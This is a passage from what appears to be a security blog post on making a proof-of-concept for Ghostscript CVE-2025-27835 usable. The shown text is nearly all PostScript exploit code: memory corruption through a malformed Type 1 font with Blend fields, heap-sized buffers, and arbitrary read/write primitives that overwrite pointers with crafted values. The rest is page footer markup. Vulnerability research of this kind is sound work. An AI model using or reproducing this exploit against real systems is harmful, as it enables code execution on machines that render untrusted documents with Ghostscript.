</span></span><span class="line"><span class="cl">    <span class="nv">/ptr5</span> <span class="nf">ptr3</span> <span class="mf">-8</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr5</span> <span class="p">&lt;</span><span class="nf">02504c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr6</span> <span class="nf">ptr3</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr6</span> <span class="p">&lt;</span><span class="nf">784b4c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr7</span> <span class="nf">ptr3</span> <span class="mf">24</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/buf5</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr3</span> <span class="mf">749546</span> <span class="nf">ptradd</span> <span class="nf">buf5</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr7</span> <span class="nf">buf5</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr8</span> <span class="nf">ptr3</span> <span class="mf">32</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/buf6</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr3</span> <span class="mf">749554</span> <span class="nf">ptradd</span> <span class="nf">buf6</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr8</span> <span class="nf">buf6</span> <span class="mf">19</span> <span class="nf">ptradd</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr9</span> <span class="nf">ptr3</span> <span class="mf">72</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr9</span> <span class="p">&lt;</span><span class="nf">01000000504b4c00</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr10</span> <span class="nf">ptr3</span> <span class="mf">80</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr10</span> <span class="nf">buf5</span> <span class="mf">42496</span> <span class="nf">ptradd</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">buf4</span> <span class="mf">-190688</span> <span class="nf">ptradd</span> <span class="p">&lt;</span><span class="mf">01</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(actually done)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">quit</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">def</span>  <span class="c1">% DONE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">/MAIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontName</span> <span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontType</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontMatrix</span> <span class="p">[</span><span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span> <span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="nv">/lenIV</span> <span class="mf">-1</span> <span class="nv">/Subrs</span> <span class="p">[</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span> <span class="p">]</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Decoding</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Encoding</span> <span class="p">[</span> <span class="nv">/cs0</span> <span class="nv">/cs1</span> <span class="nv">/cs2</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/CharStrings</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/.notdef</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs0</span> <span class="p">{</span> <span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">1</span> <span class="nf">put</span> <span class="nv">/TARGET</span> <span class="mf">312500</span> <span class="nf">array</span> <span class="nf">def</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">OBJARR</span> <span class="nf">put</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs1</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs2</span> <span class="p">{</span> <span class="nf">DONE</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/WeightVector</span> <span class="p">[</span><span class="mf">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/$Blend</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontInfo</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendAxisTypes</span> <span class="p">[</span> <span class="nv">/foo</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignPositions</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignMap</span> <span class="p">[[[</span><span class="mf">1</span><span class="p">]]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/GlyphNames2Unicode</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Blend</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/FontBBox</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">.buildfont1</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONT</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONTNAME</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nf">setfont</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(init)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/TEXT</span> <span class="mf">625000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE2</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE1</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">SOURCE2</span> <span class="nf">REFOFS</span> <span class="p">&lt;</span><span class="mf">7e12</span><span class="p">&gt;</span> <span class="nf">putinterval</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nv">/FontInfo</span> <span class="nf">get</span> <span class="nv">/GlyphNames2Unicode</span> <span class="nf">get</span> <span class="mf">1</span> <span class="nf">SOURCE1</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nv">/CharStrings</span> <span class="nf">get</span> <span class="nv">/.notdef</span> <span class="nf">undef</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">0</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="mf">1</span> <span class="mf">2</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(trigger)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">0</span> <span class="mf">750</span> <span class="nf">moveto</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="nf">show</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">def</span>  <span class="c1">% MAIN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">MAIN</span>
</span></span><span class="line"><span class="cl"><span class="nf">quit</span>
</span></span></code></pre></div>
          
          
          
        </div>

        

        

        

        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.407e5b2727c1f241c95d53db24c776bea71bfc18e09511b815d669ad8caca6e9e18a53864ad364b1ccccfa2f2956768d33cfe193bfb64d3406f3b5ece354ba57.js"
          integrity="sha512-QH5bJyfB8kHJXVPbJMd2vqcb/BjglRG4FdZprYyspunhilOGStNksczM&#43;i8pVnaNM8/hk7&#43;2TTQG87Xs41S6Vw=="
          data-oid="views_posts/1752023247845-Making-Ghostscript-CVE-2025-27835-PoC-Usable/index.md"
          data-oid-likes="likes_posts/1752023247845-Making-Ghostscript-CVE-2025-27835-PoC-Usable/index.md"></script>
      

    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >PoC Report of Ghostscript CVE-2025-27835</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-05-10T00:00:00&#43;00:00">10 May 2025</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
        <ul class="flex flex-col list-none sm:flex-row">
          
            <li
              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2025
          Richard Guizar
      </p>
    

    
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script> 
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-index-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
